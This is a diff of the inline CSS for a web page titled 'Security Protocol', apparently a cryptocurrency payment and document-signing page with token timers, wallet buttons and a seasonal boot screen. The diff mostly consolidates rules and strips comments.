@@ -6,10 +6,12 @@
     <title>Security Protocol</title>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-    <style>
-        *, *::before, *::after {
-            box-sizing: border-box;
-        }
+
+<style>
+    
+*, *::before, *::after {
+    box-sizing: border-box;
+}
 
 /* ---------- Upgraded Seasonal Boot Infrastructure ---------- */
 #boot-screen {
@@ -28,20 +30,11 @@
 }
 
 /* ---------- FOUR SEASON ENVIRONMENT BACKDROPS ---------- */
-#boot-screen.season-spring {
-  background: #06140e; /* Emerald charcoal blend */
-}
-#boot-screen.season-summer {
-  background: #070a14; /* Deep midnight space blue */
-}
-#boot-screen.season-autumn {
-  background: #120e0b; /* Earthy wood-smoke charcoal */
-}
-#boot-screen.season-winter {
-  background: #030307; /* Freezing stark deep cosmic black */
-}
+#boot-screen.season-spring { background: #06140e; }
+#boot-screen.season-summer { background: #070a14; }
+#boot-screen.season-autumn { background: #120e0b; }
+#boot-screen.season-winter { background: #030307; }
 
-/* Fade out hook logic */
 #boot-screen.fade-out {
   opacity: 0;
   backdrop-filter: blur(12px);
@@ -53,37 +46,31 @@
   line-height: 1.8;
   white-space: pre-wrap;
   width: 100%;
-  max-width: 420px;       /* Constrains terminal text block width */
-  text-align: left;       /* Keeps terminal syntax and bullet strings perfectly straight */
+  max-width: 420px;
+  text-align: left;
   display: block;
-  margin: 0 auto;         /* Centers the code block on the screen */
+  margin: 0 auto;
   z-index: 2;
   box-sizing: border-box;
 }
 
 /* ---------- FOUR SEASON TYPOGRAPHY THEMING ENGINE ---------- */
-
-/* Spring Texts (Mint) */
 .season-text-spring { color: #00ffa6; }
 #boot-screen.season-spring .cursor { background-color: #00ffa6; }
 .glow.season-text-spring { text-shadow: 0 0 8px #00ffa6, 0 0 16px rgba(0,255,166,0.4); }
 
-/* Summer Texts (Pure Dashboard Balance Cyan) */
 .season-text-summer { color: #00f2fe; }
 #boot-screen.season-summer .cursor { background-color: #00f2fe; }
 .glow.season-text-summer { text-shadow: 0 0 8px #00f2fe, 0 0 20px rgba(0,242,254,0.6); }
 
-/* Autumn Texts (Harvest Matte Gold) */
 .season-text-autumn { color: #fbbf24; }
 #boot-screen.season-autumn .cursor { background-color: #fbbf24; }
 .glow.season-text-autumn { text-shadow: 0 0 8px #fbbf24, 0 0 16px rgba(251,191,36,0.5); }
 
-/* Winter Texts (Diamond Polar White) */
 .season-text-winter { color: #ffffff; }
 #boot-screen.season-winter .cursor { background-color: #ffffff; }
 .glow.season-text-winter { text-shadow: 0 0 8px #ffffff, 0 0 16px rgba(255,255,255,0.6); }
 
-/* Dynamic Glow Pulse Loop */
 .glow {
   animation: pulseGlow 1.5s infinite alternate;
 }
@@ -92,7 +79,6 @@
   100% { opacity: 1; }
 }
 
-/* ---------- CLEAN AUTOMATED LOADING BAR FIX --------- */
 .suspense-loader-row {
     margin: 15px 0;
     display: block;
@@ -104,7 +90,6 @@
     letter-spacing: 0.5px;
     animation: terminalFlash 1.2s ease-in-out infinite alternate;
 }
-/* Assign color values dynamically based on current parent setup rules */
 #boot-screen.season-spring .suspense-pulse-text { color: #00ffa6; }
 #boot-screen.season-summer .suspense-pulse-text { color: #00f2fe; }
 #boot-screen.season-autumn .suspense-pulse-text { color: #fbbf24; }
@@ -115,7 +100,6 @@
     100% { opacity: 1; }
 }
 
-/* Blinking terminal tracking block cursor */
 .cursor {
   display: inline-block;
   width: 10px; height: 18px;
@@ -128,7 +112,6 @@
   25%,75% { opacity: 0; }
 }
 
-/* Final screen entrance glow rule formatting variables */
 .final-glow {
   font-weight: 700;
   animation: finalGlow 1.2s ease-out forwards;
@@ -141,7 +124,7 @@
 @media (max-width: 768px) {
   #boot-text { 
     font-size: 14px; 
-    max-width: 330px; /* Sweeter compact bounding box for mobile layouts */
+    max-width: 330px;
   }
 }
 
@@ -153,1053 +136,305 @@
   pointer-events: none;
 }
 
-    /* --- Headings & Status --- */
-    #status {
-        font-size: 1.8rem;
-        margin-bottom: 29px;
-        color: #0ff;
-        text-shadow: 0 0 8px #0ff, 0 0 12px #0ff;
-        transition: all 0.3s ease-in-out;
-    }
+/* --- Typography & Elements --- */
+body {
+    margin: 0;
+    padding: 40px 20px 80px 20px;
+    font-family: 'Georgia', serif;  
+    color: #2c2825;
+    line-height: 1.55;
+    font-size: 10pt;
+    background-color: #f4efe8;
+    display: flex;
+    justify-content: center;
+}
 
-    .amount {
-        font-weight: bold;
-        font-size: 1.6rem;
-        color: #ff3fff;
-        text-shadow: 0 0 10px #ff3fff, 0 0 20px #ff3fff;
-    }
+p {
+    margin: 0 0 10px 0;
+    font-size: 1.2rem;
+    letter-spacing: 0.5px;
+}
 
-    p {
-        margin: 12px 0;
-        font-size: 1.2rem;
-        letter-spacing: 0.5px;
-    }
+/* Consolidated secondary text rules to eliminate font-family conflicts */
+p + p {
+    font-family: 'Georgia', serif; 
+    font-size: clamp(1.4rem, 3vw, 1.6rem);
+    color: #0ff;
+    text-shadow: 0 0 6px #0ff;
+    word-break: break-all;
+    overflow-wrap: normal !important;
+}
 
-    p + p {
-                font-family: 'Georgia', sans-serif; 
-        font-size: clamp(1.6rem, 4vw, 1.8rem);
-        color: #0ff;
-        text-shadow: 0 0 6px #0ff;
-        word-break: break-all;
-        overflow-wrap: normal !important;
-    }
+#status {
+    font-size: 1.8rem;
+    margin-bottom: 29px;
+    color: #0ff;
+    text-shadow: 0 0 8px #0ff, 0 0 12px #0ff;
+    transition: all 0.3s ease-in-out;
+}
 
-    #check-btn {
-        margin-top: 25px;
-        padding: 12px 25px;
-        font-size: 1rem;
-        font-weight: bold;
-        color: #fff;
-        background: linear-gradient(45deg, #0ff, #ff3fff);
-        border: none;
-        border-radius: 12px;
-        cursor: pointer;
-        text-transform: uppercase;
-        box-shadow: 0 0 8px #0ff, 0 0 16px #ff3fff;
-        transition: all 0.3s ease-in-out;
-    }
+.amount {
+    font-weight: bold;
+    font-size: 1.6rem;
+    color: #ff3fff;
+    text-shadow: 0 0 10px #ff3fff, 0 0 20px #ff3fff;
+}
 
-    #check-btn:hover {
-        transform: scale(1.05);
-        box-shadow: 0 0 12px #0ff, 0 0 24px #ff3fff;
-    }
+#check-btn {
+    margin-top: 25px;
+    padding: 12px 25px;
+    font-size: 1rem;
+    font-weight: bold;
+    color: #fff;
+    background: linear-gradient(45deg, #0ff, #ff3fff);
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    text-transform: uppercase;
+    box-shadow: 0 0 8px #0ff, 0 0 16px #ff3fff;
+    transition: all 0.3s ease-in-out;
+}
 
-    /* Timer Styling */
-    #usdt-timer, #usdc-timer {
-        font-size: 1rem;
-        font-weight: bold !important;
-        color: var(--accent-red) !important;
-        text-shadow: 0 0 5px rgba(239, 68, 68, 0.4);
-        margin-top: 15px;
-        text-align: center;
-    }
+#check-btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 12px #0ff, 0 0 24px #ff3fff;
+}
 
-    /* Progress Bar */
-    .progress-bar {
-        width: 100%;
-        height: 18px;
-        background: rgba(255,255,255,0.06);
-        border-radius: 12px;
-        overflow: hidden;
-        margin: 18px 0;
-    }
+#usdt-timer, #usdc-timer {
+    font-size: 1rem;
+    font-weight: bold !important;
+    color: var(--accent-red) !important;
+    text-shadow: 0 0 5px rgba(239, 68, 68, 0.4);
+    margin-top: 15px;
+    text-align: center;
+}
 
-    .progress-fill {
-        height: 100%;
-        width: 0%;
-        border-radius: 12px;
-        position: relative;
-        transition: width 0.6s ease;
-        background: var(--accent-red);
-        box-shadow: 0 0 20px rgba(79,172,254,0.6);
-    }
+.progress-bar {
+    width: 100%;
+    height: 18px;
+    background: rgba(255,255,255,0.06);
+    border-radius: 12px;
+    overflow: hidden;
+    margin: 18px 0;
+}
 
-    .progress-fill::after {
-        content: "";
-        position: absolute;
-        inset: 0;
-        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-        animation: energyFlow 2.5s linear infinite;
-    }
+.progress-fill {
+    height: 100%;
+    width: 0%;
+    border-radius: 12px;
+    position: relative;
+    transition: width 0.6s ease;
+    background: var(--accent-red);
+    box-shadow: 0 0 20px rgba(79,172,254,0.6);
+}
 
-    @keyframes energyFlow {
-        0% { transform: translateX(100%); }
-        100% { transform: translateX(-100%); }
-    }
+.progress-fill::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+    animation: energyFlow 2.5s linear infinite;
+}
 
-    .plan-pay {
-        display: flex;
-        align-items: center;      /* vertically center logo & text */
-        justify-content: center;  /* horizontal center */
-        gap: 8px;                 /* spacing between logo and text */
-        flex-wrap: wrap;          /* wrap if screen too small */
-    }
+@keyframes energyFlow {
+    0% { transform: translateX(100%); }
+    100% { transform: translateX(-100%); }
+}
 
-    .plan-logo {
-        width: 40px;
-        height: 40px;
-        border-radius: 50%;
-        margin: 0;                /* remove previous margin */
-    }
+.plan-pay {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    flex-wrap: wrap;
+}
 
-    .token-name, .network {
-        display: inline-block;
-        font-weight: bold;
-        color: #fff;
-    }
+.plan-logo {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    margin: 0;
+}
 
-    .plan-pay a:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 0 18px rgba(155, 89, 182, 0.7);
-    }
+.token-name, .network {
+    display: inline-block;
+    font-weight: bold;
+    color: #fff;
+}
 
-    /* Segmented Control Token Selector */
-    #tokenSelector {
-        display: flex;
-        background: rgba(0, 0, 0, 0.3);
-        border-radius: 12px;
-        padding: 4px;
-        gap: 6px;
-        margin-bottom: 20px;
-        border: 1px solid rgba(0, 255, 255, 0.2);
-    }
+#tokenSelector {
+    display: flex;
+    background: rgba(0, 0, 0, 0.3);
+    border-radius: 12px;
+    padding: 4px;
+    gap: 6px;
+    margin-bottom: 20px;
+    border: 1px solid rgba(0, 255, 255, 0.2);
+}
 
-    #tokenSelector button {
-        flex: 1;
-        padding: 10px 0;
-        font-size: 0.85rem;
-        font-weight: bold;
-        color: #8a8f9d;
-        background: transparent;
-        border: none;
-        border-radius: 8px;
-        cursor: pointer;
-        text-transform: uppercase;
-        transition: all 0.3s ease-in-out;
-    }
+#tokenSelector button {
+    flex: 1;
+    padding: 10px 0;
+    font-size: 0.85rem;
+    font-weight: bold;
+    color: #8a8f9d;
+    background: transparent;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: all 0.3s ease-in-out;
+}
 
-    #tokenSelector button.active {
-        color: #fff;
-        background: linear-gradient(135deg, #0ff, #ff3fff);
-        box-shadow: 0 0 10px rgba(0, 255, 255, 0.4);
-    }
+#tokenSelector button.active {
+    color: #fff;
+    background: linear-gradient(135deg, #0ff, #ff3fff);
+    box-shadow: 0 0 10px rgba(0, 255, 255, 0.4);
+}
 
-    .copy-btn {
-        margin-left: 8px;
-        padding: 2px 6px;
-        font-size: 0.8rem;
-        border: none;
-        border-radius: 4px;
-        background: linear-gradient(45deg, #0ff, #ff3fff);
-        color: #fff;
-        cursor: pointer;
-        transition: 0.2s;
-    }
+.copy-btn {
+    margin-left: 8px;
+    padding: 2px 6px;
+    font-size: 0.8rem;
+    border: none;
+    border-radius: 4px;
+    background: linear-gradient(45deg, #0ff, #ff3fff);
+    color: #fff;
+    cursor: pointer;
+    transition: 0.2s;
+}
 
-    .copy-btn:hover {
-        transform: scale(1.1);
-        box-shadow: 0 0 6px #0ff, 0 0 12px #ff3fff;
-    }
+.copy-btn:hover {
+    transform: scale(1.1);
+    box-shadow: 0 0 6px #0ff, 0 0 12px #ff3fff;
+}
 
-    .header {
-        text-align: center;
-        margin-bottom: 1rem;
-    }
+.header {
+    text-align: center;
+    margin-bottom: 1rem;
+}
 
-    .badge {
-        display: inline-block;
-        background-color: rgba(239, 68, 68, 0.15);
-        color: var(--accent-red);
-        font-size: 0.75rem;
-        font-weight: 700;
-        padding: 0.25rem 0.75rem;
-        border-radius: 9999px;
-        border: 1px solid rgba(239, 68, 68, 0.3);
-        text-transform: uppercase;
-        letter-spacing: 0.05em;
-        margin-bottom: 0.75rem;
-    }
+.badge {
+    display: inline-block;
+    background-color: rgba(239, 68, 68, 0.15);
+    color: var(--accent-red);
+    font-size: 0.75rem;
+    font-weight: 700;
+    padding: 0.25rem 0.75rem;
+    border-radius: 9999px;
+    border: 1px solid rgba(239, 68, 68, 0.3);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    margin-bottom: 0.75rem;
+}
 
-    .footer-note {
-        margin-top: 1.5rem;
-        font-size: 0.75rem;
-        color: var(--text-muted);
-        text-align: center;
-        line-height: 1.3;
-    }
+.footer-note {
+    margin-top: 1.5rem;
+    font-size: 0.75rem;
+    color: var(--text-muted);
+    text-align: center;
+    line-height: 1.3;
+}
 
-    .qr-section div {
-        margin: 0 auto;
-        border-radius: 12px;
-    }
+.qr-section div {
+    margin: 0 auto;
+    border-radius: 12px;
+}
 
-    .token-card.inactive {
-        display: none;
-    }
+.token-card.inactive {
+    display: none;
+}
 
-    /* ---------- Notification Bar ---------- */
-    .notification-bar {
-        position: fixed;
-        top: -80px;
-        right: 20px;
-        background: rgba(30, 144, 255, 0.25);
-        backdrop-filter: blur(12px);
-        border: 1px solid rgba(30,144,255,0.4);
-        color: #fff;
-        padding: 12px 18px;
-        border-radius: 12px;
-        font-size: 14px;
-        font-weight: bold;
-        box-shadow: 0 6px 18px rgba(0,0,0,0.25);
-        transition: top 0.5s ease, opacity 0.5s ease;
-        z-index: 9999;
-        opacity: 0;
-        max-width: 350px;
-        white-space: normal;
-        overflow: hidden;
-    }
+/* ---------- Notification Bar ---------- */
+.notification-bar {
+    position: fixed;
+    top: -80px;
+    right: 20px;
+    background: rgba(30, 144, 255, 0.25);
+    backdrop-filter: blur(12px);
+    border: 1px solid rgba(30,144,255,0.4);
+    color: #fff;
+    padding: 12px 18px;
+    border-radius: 12px;
+    font-size: 14px;
+    font-weight: bold;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+    transition: top 0.5s ease, opacity 0.5s ease;
+    z-index: 9999;
+    opacity: 0;
+    max-width: 350px;
+    white-space: normal;
+    overflow: hidden;
+}
 
-    .notification-bar.show { top: 20px; opacity: 1; }
+.notification-bar.show { top: 20px; opacity: 1; }
 
-    .notification-bar::before {
-        content: '';
-        position: absolute;
-        left: -50%;
-        top: 0;
-        width: 50%;
-        height: 100%;
-        background: rgba(255,255,255,0.3);
-        transform: skewX(-25deg);
-        animation: liquidWave 2s linear infinite;
-    }
+.walletconnect-actions {
+    margin-top: 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+}
 
-    @keyframes liquidWave { 0% { left: -50%; } 100% { left: 100%; } }
-
-    .walletconnect-actions {
-        margin-top:20px;
-        display:flex;
-        flex-direction:column;
-        gap:12px;
-    }
-
-    /* Container centered layout */
-    .status-animation-container {
-        margin-top: 18px;
-                font-family: 'Georgia', sans-serif; 
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        gap: 8px;
-        width: 100%;
-    }
-
-    .payment-line-wrapper {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 12px;
-        width: 100%;
-        color: #0ff;
-        font-size: 0.9rem;
-        font-weight: bold;
-        text-shadow: 0 0 8px rgba(0, 255, 255, 0.6);
-    }
-
-    .label-text {
-        letter-spacing: 1px;
-        transition: color 0.4s ease, text-shadow 0.4s ease;
-    }
-
-    /* Middle Line Track */
-    .cyber-line-track {
-        flex: 1;
-        max-width: 160px;
-        height: 3px;
-        background: rgba(0, 255, 255, 0.2);
-        border-radius: 4px;
-        position: relative;
-        overflow: hidden;
-    }
-
-    .cyber-line-pulse {
-        position: absolute;
-        top: 0;
-        left: -40%;
-        width: 40%;
-        height: 100%;
-        background: linear-gradient(90deg, transparent, #0ff, transparent);
-        box-shadow: 0 0 8px #0ff;
-        animation: bouncePulse 1.2s ease-in-out infinite alternate;
-    }
-
-    @keyframes bouncePulse {
-        0% { left: -10%; }
-        100% { left: 70%; }
-    }
-
-    .checkmark-wrapper {
-        display: inline-flex;
-        align-items: center;
-        justify-content: center;
-        width: 22px;
-        height: 22px;
-        margin-left: 4px;
-        opacity: 0;
-        transform: scale(0.5);
-        transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    }
-
-    .checkmark-wrapper.active {
-        opacity: 1;
-        transform: scale(1);
-    }
-
-    .checkmark-svg {
-        width: 22px;
-        height: 22px;
-        border-radius: 50%;
-        display: block;
-        stroke-width: 3;
-        stroke: #10b981;
-        stroke-miterlimit: 10;
-        box-shadow: inset 0px 0px 0px #10b981;
-        animation: fillCircle .4s ease-in-out .4s forwards;
-    }
-
-    .checkmark-circle {
-        stroke-dasharray: 166;
-        stroke-dashoffset: 166;
-        stroke-width: 3;
-        stroke-miterlimit: 10;
-        stroke: #10b981;
-        fill: none;
-        animation: strokeCircle 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
-    }
-
-    .checkmark-check {
-        transform-origin: 50% 50%;
-        stroke-dasharray: 48;
-        stroke-dashoffset: 48;
-        animation: strokeCheck 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.5s forwards;
-    }
-
-    @keyframes strokeCircle {
-        100% { stroke-dashoffset: 0; }
-    }
-
-    @keyframes strokeCheck {
-        100% { stroke-dashoffset: 0; }
-    }
-
-    @keyframes fillCircle {
-        100% { box-shadow: inset 0px 0px 0px 30px rgba(16, 185, 129, 0.2); }
-    }
-
-    .payment-line-wrapper.success .label-text.received {
-        color: #10b981;
-        text-shadow: 0 0 10px rgba(16, 185, 129, 0.8);
-    }
-
-    .payment-line-wrapper.success .cyber-line-track {
-        background: rgba(16, 185, 129, 0.3);
-    }
-
-    .payment-line-wrapper.success .cyber-line-pulse {
-        animation: none;
-        left: 0;
-        width: 100%;
-        background: #10b981;
-        box-shadow: 0 0 10px #10b981;
-        transition: all 0.4s ease;
-    }
-
-    .wallet-btn {
-        width:100%;
-        padding:14px 18px;
-        border:none;
-        border-radius:14px;
-        font-size:15px;
-        font-weight:700;
-        color:#fff;
-        background:linear-gradient(135deg,#6b2cd8,#9b59b6);
-        box-shadow:
-          0 0 12px rgba(107,44,216,0.5),
-          0 0 24px rgba(155,89,182,0.3);
-        transition:all .25s ease;
-    }
-
-    .wallet-btn:hover {
-        transform:translateY(-2px);
-        box-shadow:
-          0 0 18px rgba(107,44,216,0.7),
-          0 0 36px rgba(155,89,182,0.45);
-    }
-
-    @media (max-width: 400px) {
-        #payment-container {
-            padding: 20px 15px;
-            max-width: 300px;
-        }
-        .amount {
-            font-size: 1.4rem;
-        }
-        p {
-            font-size: 0.9rem;
-        }
-        #status {
-            font-size: 1.4rem;
-        }
-    }
-
-/* ---------- Glass Cards ---------- */
+/* ---------- Glass Cards (Updated constraint) ---------- */
 .glass-card {
   background: rgba(255,255,255,0.12);
   backdrop-filter: blur(12px);
   border-radius: 18px;
   padding: 28px;
-  margin: 80px auto 30px;
+  margin: 20px auto;
   box-shadow: 0 10px 30px rgba(0,0,0,0.35);
-  max-width: 280px !important;
+  width: 100%;
+  max-width: 100% !important;
 }
 
-/* ---------- Checkbox ---------- */
 .checkbox-container {
   display: flex;
-  flex-direction: row-reverse; /* Flips the visual order so input goes to the right */
-  align-items: flex-end;      /* CHANGED: Pulls the checkbox down to the bottom edge */
-  justify-content: space-between; /* Pushes text to left, checkbox to far right */
-  gap: 16px; /* Slightly more breathing room since it's on the right */
+  flex-direction: row-reverse;
+  align-items: flex-end;
+  justify-content: space-between;
+  gap: 16px;
   margin-top: 14px;
 }
 
-        .security-note img.security-avatar {
-    width: 20px;
-    height: 20px;
-    border-radius: 50%;
-    object-fit: cover;
-    flex-shrink: 0;
-
-}
-
 .checkbox-container input {
-  margin-bottom: 4px;         /* CHANGED: Switched from top to bottom margin for a cleaner baseline alignment */
+  margin-bottom: 4px;
   cursor: pointer;
 }
 
 .checkbox-container label {
-  flex: 1; /* Ensures the label takes up all remaining space on the left */
+  flex: 1;
 }
 
-
-/* Red warning glow */
-.neon-card.warning {
-  animation: warning-glow 0.8s ease-in-out 2;
-  box-shadow: 0 0 20px 4px rgba(255,77,77,0.9);
-}
-
-@keyframes warning-glow {
-  0% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
-  50% { box-shadow: 0 0 20px 6px rgba(255,77,77,0.9); }
-  100% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
-}
-
-        body {
-            margin: 0;
-            padding: 40px 20px 80px 20px;
-            font-family: 'Georgia', serif;  
-            color: #2c2825;
-            line-height: 1.55;
-            font-size: 10pt;
-            background-color: #f4efe8;
-            display: flex;
-            justify-content: center;
-        }
-
-        .document-card {
-            max-width: 800px;
-            width: 100%;
-            background-color: #fcfbf9;
-            padding: 40px;
-            border-radius: 8px;
-            border: 1px solid #e6dfd5;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
-        }
-
-        .header {
-            border-bottom: 2px solid #e8e2d9;
-            padding-bottom: 15px;
-            margin-bottom: 25px;
-        }
-
-        .doc-subtitle {
-            font-size: 11pt;
-            font-weight: 500;
-            color: #d96b43;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin: 0;
-        }
-
-        .meta-grid {
-            display: table;
-            width: 100%;
-            margin-bottom: 25px;
-            background-color: #f4efe8;
-            border-radius: 6px;
-            padding: 14px 16px;
-            border: 1px solid #e6dfd5;
-        }
-
-        .meta-row {
-            display: table-row;
-        }
-
-        .meta-cell {
-            display: table-cell;
-            padding: 4px 10px;
-            font-size: 9.5pt;
-        }
-
-        .meta-label {
-            font-weight: 700;
-            color: #635b54;
-            width: 15%;
-        }
-
-        .meta-value {
-            color: #2c2825;
-            width: 35%;
-        }
-
-        /* ---------- Mini TV Video ---------- */
-.video-container {
-    position: relative;
+.document-card {
+    max-width: 800px;
     width: 100%;
-    max-width: 600px;
-    margin: 20px auto;
-    border-radius: 16px;
-    overflow: hidden;
-    background: rgba(0,0,0,0.3);
-    backdrop-filter: blur(8px);
+    background-color: #fcfbf9;
+    padding: 40px;
+    border-radius: 8px;
+    border: 1px solid #e6dfd5;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
 }
 
-.video-overlay {
-    position: absolute;
-    top: 12px;
-    left: 12px;
-    background: rgba(107,44,216,0.25);
-    backdrop-filter: blur(8px);
-    padding: 6px 12px;
-    border-radius: 12px;
-    font-size: 12px;
+.wallet-btn {
+    width: 100%;
+    padding: 14px 18px;
+    border: none;
+    border-radius: 14px;
+    font-size: 15px;
+    font-weight: 700;
     color: #fff;
-    font-weight: bold;
-    box-shadow: 0 4px 12px rgba(107,44,216,0.5);
+    background: linear-gradient(135deg,#6b2cd8,#9b59b6);
+    box-shadow: 0 0 12px rgba(107,44,216,0.5), 0 0 24px rgba(155,89,182,0.3);
+    transition: all .25s ease;
 }
 
-.video-container video {
-    width: 100%;
-    display: block;
+.wallet-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 18px rgba(107,44,216,0.7), 0 0 36px rgba(155,89,182,0.45);
 }
-
-/* --- SURGICAL CONTROL REMOVALS --- */
-
-/* Strips out the center play icon overlays */
-video::-webkit-media-controls-start-playback-button,
-video::-webkit-media-controls-overlay-play-button {
-    display: none !important;
-    -webkit-appearance: none !important;
-    opacity: 0 !important;
-    pointer-events: none !important;
-}
-
-/* Hides the bottom left control bar play/pause toggle */
-video::-webkit-media-controls-play-button {
-    display: none !important;
-    opacity: 0 !important;
-    pointer-events: none !important;
-}
-
-/* Hides the horizontal progress line / slider tracker */
-video::-webkit-media-controls-timeline {
-    display: none !important;
-    opacity: 0 !important;
-    pointer-events: none !important;
-}
-
-/* Hides the numerical duration text string (e.g., 0:24 / 0:43) */
-video::-webkit-media-controls-current-time-display,
-video::-webkit-media-controls-time-remaining-display {
-    display: none !important;
-    opacity: 0 !important;
-    pointer-events: none !important;
-}
-
-.video-controls {
-    display: flex;
-    justify-content: flex-end;
-    margin-top: 4px;
-}
-
-.video-controls input[type=range] {
-    width: 100px;
-}
-
-
-        h2 {
-            font-size: 13pt;
-            font-weight: 700;
-            color: #1a1615;
-            border-left: 4px solid #d96b43;
-            padding-left: 10px;
-            margin: 22px 0 10px 0;
-        }
-
-        p {
-            margin: 0 0 10px 0;
-        }
-
-                ul {
-            margin: 0 0 12px 0;
-            padding-left: 20px;
-        }
-
-        ul ul {
-            list-style-type: circle;
-        }
-
-        li {
-            margin-bottom: 5px;
-        }
-
-
-        .table-container {
-            width: 100%;
-            margin: 12px 0 20px 0;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 9.5pt;
-        }
-
-        th {
-            background-color: #2c2825;
-            color: #ffffff;
-            font-weight: 600;
-            text-align: left;
-            padding: 8px 12px;
-            font-size: 9pt;
-            letter-spacing: 0.5px;
-        }
-
-        td {
-            padding: 9px 12px;
-            border-bottom: 1px solid #e8e2d9;
-            vertical-align: top;
-        }
-
-        tr:nth-child(even) td {
-            background-color: #f8f5f0;
-        }
-
-        .highlight-box {
-            background-color: #fff8f5;
-            border: 1px solid #f0d5c8;
-            border-left: 4px solid #d96b43;
-            border-radius: 4px;
-            padding: 12px 15px;
-            margin: 15px 0;
-            font-size: 9.5pt;
-        }
-
-        .signature-section {
-            margin-top: 35px;
-        }
-
-        .sig-table {
-            display: table;
-            width: 100%;
-            margin-top: 20px;
-        }
-
-        .sig-row {
-            display: table-row;
-        }
-
-        .sig-col {
-            display: table-cell;
-            width: 48%;
-            padding-right: 4%;
-            vertical-align: top;
-        }
-
-        .sig-col:last-child {
-            padding-right: 0;
-        }
-
-        .sig-box {
-            border-top: 1px solid #2c2825;
-            padding-top: 8px;
-            margin-top: 45px;
-        }
-
-        .sig-title {
-            font-weight: 700;
-            font-size: 10pt;
-            color: #1a1615;
-            margin-bottom: 2px;
-        }
-
-        .sig-sub {
-            font-size: 8.5pt;
-            color: #635b54;
-        }
-
-        /* Standard Client Signature Styling */
-        .signature-font {
-            font-family: 'Brush Script MT', 'cursive', sans-serif;
-            font-size: 18pt;
-            color: #1a2a3a;
-            margin-bottom: -35px;
-            margin-left: 10px;
-        }
-
-        /* Distinct Contractor Signature Styling */
-        .contractor-sig-font {
-            font-family: 'Caveat', 'Segoe Script', 'Bradley Hand', cursive;
-            font-size: 26pt;
-            font-weight: 600;
-            color: #1d3557; /* Deep ink blue */
-            margin-bottom: -38px;
-            margin-left: 8px;
-            display: inline-block;
-            transform: rotate(-2deg); /* Slight natural ink tilt */
-            letter-spacing: 0.5px;
-            user-select: none;
-        }
-
-        /* Interactive Action Box */
-        .action-container {
-            margin-top: 40px;
-            padding-top: 25px;
-            border-top: 2px dashed #e8e2d9;
-            text-align: center;
-        }
-
-
-        .sign-btn {
-            background-color: #d96b43;
-            color: #ffffff;
-            font-size: 11pt;
-            font-weight: 700;
-            border: none;
-            padding: 14px 28px;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background-color 0.2s ease;
-        }
-
-        .sign-btn:hover {
-            background-color: #be5934;
-        }
-
-        @media screen and (max-width: 768px) {
-            .meta-grid {
-                display: block !important;
-                width: 100% !important;
-                box-sizing: border-box !important;
-            }
-
-            .meta-row {
-                display: grid !important;
-                grid-template-columns: auto 1fr !important;
-                gap: 6px 12px !important;
-                margin-bottom: 8px;
-            }
-
-            .meta-row:last-child {
-                margin-bottom: 0;
-            }
-
-            .meta-cell {
-                display: block !important;
-                width: auto !important;
-                padding: 0 !important;
-            }
-        }
-
-.step-image {
-    width: 100%; /* or a smaller width, e.g., 300px */
-height: 180px;   /* reduce this value */
-    max-width: 100%;
-    margin-top: 10px;
-    border-radius: 8px; /* optional for rounded corners */
-}
-        /* Footer */
-        footer {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            text-align: center;
-            padding: 18px 0;
-            font-size: 14px;
-            color: #555;
-            background: rgba(255, 255, 255, 0.92);
-            backdrop-filter: blur(12px);
-            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.08);
-            z-index: 6;
-        }
-
-/* =========================
-TOP RIGHT PROFILE POSITION
-========================= */
-.top-right-profile {
-    position: fixed;
-    top: 15px;
-    right: 15px;
-    z-index: 999;
-}
-
-#profilePhoto:not([src]), 
-#profilePhoto[src="default-avatar.png"] {
-    content: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23c0a9ff'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5-4-8-4z'/%3E%3C/svg%3E") !important;
-    background: #1a1625 !important;
-    box-sizing: border-box !important;
-    padding: 6px !important;
-}
-
-
-/* =========================
-OUTER RING WRAPPER
-========================= */
-.avatar-ring {
-    width: 52px;
-    height: 52px;
-    border-radius: 50%;
-    padding: 3px;
-    position: relative;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-
-/* =========================
-PURPLE NEON SPIN + PULSE
-========================= */
-.avatar-ring::before {
-    content: "";
-    position: absolute;
-    inset: 0;
-    border-radius: 50%;
-
-    /* PURE PURPLE GLOW */
-    background: conic-gradient(
-        #a855f7,
-        #7c3aed,
-        #a855f7
-    );
-
-    animation:
-    spin 3s linear infinite,
-    hueShift 6s linear infinite;
-
-    filter: blur(5px);
-    opacity: 0.9;
-    z-index: 0;
-}
-
-
-/* =========================
-INNER CUT
-========================= */
-.avatar-ring::after {
-    content: "";
-    position: absolute;
-    inset: 4px;
-    background: transparent;
-    border-radius: 50%;
